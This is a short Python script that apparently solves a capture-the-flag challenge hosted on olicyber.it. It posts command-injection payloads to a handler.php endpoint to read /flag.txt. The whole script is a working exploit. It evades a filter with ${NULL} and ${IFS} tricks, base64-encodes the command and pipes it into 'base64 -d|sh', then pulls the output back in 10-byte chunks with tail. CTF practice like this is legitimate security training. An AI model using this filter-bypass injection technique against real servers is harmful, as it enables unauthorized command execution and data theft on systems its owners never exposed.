import requests
from base64 import b64encode

url = "http://timp.challs.olicyber.it/handler.php"
a = True
b = True

while a:
    byte = 10
    resp, flag = "", [""]
    PAYLOAD = 'cat /flag.txt'.encode()
    while b:
        f = PAYLOAD + b'|tail -c ' + str(byte).encode()
        data = {"cmd":"ech${NULL}o${IFS}"+ b64encode(f).decode() + "|base64${IFS}-d|sh"}
        r = requests.post(url, data=data)
        if resp == r.text:
            break
        else:
            resp = r.text
            byte += 10
            flag.append(resp)
    print("".join(flag[::-1]))
    a = False
    b = False
